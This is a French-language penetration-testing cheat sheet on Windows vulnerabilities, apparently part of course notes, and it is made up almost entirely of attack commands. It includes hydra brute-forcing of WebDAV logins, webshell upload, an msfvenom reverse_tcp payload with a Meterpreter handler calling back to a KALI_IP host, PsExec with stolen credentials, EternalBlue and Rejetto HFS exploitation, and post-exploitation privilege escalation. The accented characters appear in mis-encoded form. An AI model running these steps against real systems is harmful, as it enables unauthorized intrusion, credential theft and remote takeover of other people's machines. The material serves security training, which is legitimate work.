# ü™ü Vuln√©rabilit√©s Windows

[‚Üê Retour √† la table des mati√®res](../README.md)

## Types d'attaques Windows

### üéØ Cat√©gories principales
- **Information Disclosure** : Fuite d'informations sensibles
- **Buffer Overflow** : D√©bordement de tampon
- **Remote Code Execution** : Ex√©cution de code √† distance
- **Privilege Escalation** : √âl√©vation de privil√®ges
- **Denial of Service** : D√©ni de service

## Exploitation de services Windows

### IIS WebDAV
```bash
# Scan initial
nmap -sV -sC targetIP
nmap -sV -p 80 --script=http-enum targetIP

# Bruteforce WebDAV si authentification requise
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt targetIP http-get /webdav/

# Test des capacit√©s WebDAV
davtest -auth user:password -url http://targetIP/webdav

# Upload de webshell
cadaver http://targetIP/webdav
# Dans cadaver :
put /usr/share/webshells/asp/webshell.asp
```

### Meterpreter via WebDAV
```bash
# G√©n√©ration du payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=1234 -f asp > shell.asp

# Upload via cadaver
cadaver http://targetIP/webdav
put /path/to/shell.asp

# Handler Metasploit
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST KALI_IP
set LPORT 1234
run
```

### Module MSF automatique WebDAV
```bash
use exploit/windows/iis/iis_webdav_upload_asp
set HTTPUSERNAME username
set HTTPPASSWORD password
set RHOSTS targetIP
set PATH webdav/metasploit.asp
run
```

## SMB avec PsExec
```bash
# N√©cessite des credentials l√©gitimes (user/password ou hash)

# Test de login SMB
use auxiliary/scanner/smb/smb_login
set RHOSTS targetIP
set SMBUser administrator
set SMBPass password
run

# PsExec avec Impacket
psexec.py administrator@targetIP cmd.exe

# PsExec avec Metasploit
use exploit/windows/smb/psexec
set RHOSTS targetIP
set SMBUser administrator
set SMBPass password
run
```

## MS17-010 EternalBlue

### D√©tection
```bash
# Nmap script
nmap -sV -p 445 --script=smb-vuln-ms17-010 targetIP

# Metasploit scanner
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS targetIP
run
```

### Exploitation
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS targetIP
run
```

## Exemple d'exploitation HFS

### Recherche d'exploits
```bash
# Recherche avec searchsploit
searchsploit hfs

# R√©sultats typiques :
# HFS (HTTP File Server) 2.3.x - Remote Command Execution
# Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)
```

### Exploitation avec Metasploit
```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS targetIP
run
# Obtention d'un meterpreter
```

### Post-exploitation
```bash
# Migration vers explorer.exe
ps -S explorer.exe
migrate PID_FOUND

# Tentative d'√©l√©vation de privil√®ges
getsystem

# Si getsystem √©choue, v√©rifier les groupes
shell
net localgroup administrators
```